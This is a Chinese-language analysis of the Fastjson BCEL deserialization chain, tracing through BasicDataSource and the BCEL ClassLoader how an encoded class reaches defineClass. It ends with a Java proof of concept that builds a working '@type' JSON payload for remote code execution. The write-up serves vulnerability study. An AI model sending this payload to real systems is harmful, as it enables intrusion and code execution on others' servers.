# Fastjson-BCEL利用链

介绍：

org.apache.bcel.util.ClassLoader 是 Apache BCEL 库的一部分，用于动态加载和解析 Java 字节码。
BCEL允许用户操作和生成字节码，ClassLoader实现可通过loadClass方法加载用户提供的类。

成因：

在org.apache.bcel.util.ClassLoader类中有一个loadClass方法，
如果class_name.indexOf("$$BCEL$$") >= 0条件成立，
就会调用createClass传入class_name

<img width="1410" height="1290" alt="image" src="https://github.com/user-attachments/assets/5c75fe2a-19b9-4b06-b4b8-a0a7b4dab6ed" />

跟进createClass()，
首先是判断传入的class_name是否以$$BCEL$$开头，
在下面调用了decode方法对传入的real_name进行解码，
最后将clazz返回

<img width="1437" height="945" alt="image" src="https://github.com/user-attachments/assets/a7ba6957-dc38-464d-83a3-9831d34bff87" />

回到loadClass方法，
如果返回的clazz不为空，那就会调用defineClass去加载class_name和byte字节数组，
如果传入的byte是一段经过Utility.encode编码后的恶意class，那就会触发恶意代码

<img width="1140" height="204" alt="image" src="https://github.com/user-attachments/assets/389b6a47-6997-4ffd-8a9a-067acd14a172" />

如何才能触发到loadClass方法？

在tomcat包的dbcp下有一个BasicDataSource类中有一个createConnectionFactory()方法使用了Class.forName，

如果传入的driverClassLoader不为空，那就调用driverClassLoader去加载driverClassName，
如果在这里将driverClassLoader改成bcel.internal.util.ClassLoader，将driverClassName改成经过Utility.encode编码后的恶意class，Class.forName就会去加载这个恶意类

<img width="1704" height="879" alt="image" src="https://github.com/user-attachments/assets/aad83a4c-cc5f-4a4e-8fb2-a51c086c5feb" />

这两个参数是可控的

<img width="1302" height="210" alt="image" src="https://github.com/user-attachments/assets/246b44c3-54e7-475c-a62d-abdbfd5fba49" />

<img width="1230" height="138" alt="image" src="https://github.com/user-attachments/assets/2aeec121-a3f9-49f1-b8a3-1cc6a76f4ae6" />

跟踪调用链，是哪里调用了createConnectionFactory()方法，
在createDataSource()存在调用

<img width="1595" height="750" alt="image" src="https://github.com/user-attachments/assets/eb1a5208-444f-4c02-a0e7-addc15779098" />

继续跟踪，
在getConnection()方法又调用了createDataSource()

<img width="1371" height="588" alt="image" src="https://github.com/user-attachments/assets/828e7fe9-d730-467b-9904-183e98b9ce92" />

Payload：

首先生成恶意类

<img width="849" height="327" alt="image" src="https://github.com/user-attachments/assets/57e88b93-8a03-44d4-8f15-a49449529189" />

编译成class文件，
读取恶意class，利用Utility.encode将其编码，
@type指向BasicDataSource类，设置driverClassName为编码后的code，再@type将driverClassloader指向bcel.internal.util.ClassLoader，利用bcel.internal.util.ClassLoader加载恶意的class类

<img width="2400" height="567" alt="image" src="https://github.com/user-attachments/assets/540cea33-ea44-43d6-843a-b234648890ca" />

    public class Bcel {

    public static void main(String[] args) throws Exception {

        byte[] bytes = Files.readAllBytes(Paths.get("D:\\code-audit\\Fastjson1\\src\\main\\java\\EEEE.class"));
        String code = Utility.encode(bytes, true);
        String s = "{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassName\":\"$$BCEL$$" + code + "\",\"driverClassloader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}}";
        JSON.parseObject(s);
    }
    
    }

<img width="1797" height="942" alt="image" src="https://github.com/user-attachments/assets/c038b158-2a83-4b49-97c6-3b5be83d2f56" />

参考连接：

https://y4er.com/posts/fastjson-learn/

https://www.bilibili.com/video/BV1pP411N726/
